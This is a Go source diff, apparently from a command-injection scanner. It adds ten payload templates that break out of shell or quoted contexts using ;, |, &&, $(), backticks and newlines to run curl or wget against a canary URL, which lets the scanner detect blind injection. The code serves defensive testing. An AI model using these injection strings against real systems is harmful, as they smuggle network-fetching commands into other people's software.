@@ -52,6 +52,28 @@ var payloadFormats = []string{
 	"`expr %d \\* %d`",  // backtick command substitution
 }
 
+// oobCmdFormats are OS-command-injection payload templates. Each embeds a single
+// canary URL (the %s): a tool that passes the argument to a shell (directly or
+// via os/system, subprocess with shell=True, backtick eval, etc.) will fetch the
+// URL, producing an out-of-band callback on the collector. This catches BLIND
+// command injection — the sink runs but returns nothing to the client — which the
+// computed-arithmetic payloadFormats above cannot, since they rely on the result
+// being reflected in-band. The separators cover POSIX shells (`;`, `|`, `&&`,
+// newline, `$(...)`, backticks) and Windows cmd (`&`); curl and wget both ship on
+// modern Linux/macOS and curl ships on Windows 10+.
+var oobCmdFormats = []string{
+	"; curl -s %s",      // statement separator
+	"| curl -s %s",      // pipe
+	"& curl -s %s",      // background / Windows cmd separator
+	"&& curl -s %s",     // conditional chain
+	"$(curl -s %s)",     // command substitution
+	"`curl -s %s`",      // backtick command substitution
+	"; wget -qO- %s",    // wget fallback where curl is absent
+	"\ncurl -s %s",      // newline injection (also covers direct-exec sinks)
+	"' ; curl -s %s ;",  // break out of single-quoted context
+	"\" ; curl -s %s ;", // break out of double-quoted context
+}
+
 // newCanary builds a canary from two random factors. The product is ~9 digits,
 // making a coincidental appearance in benign output vanishingly unlikely.
 func newCanary() canary {
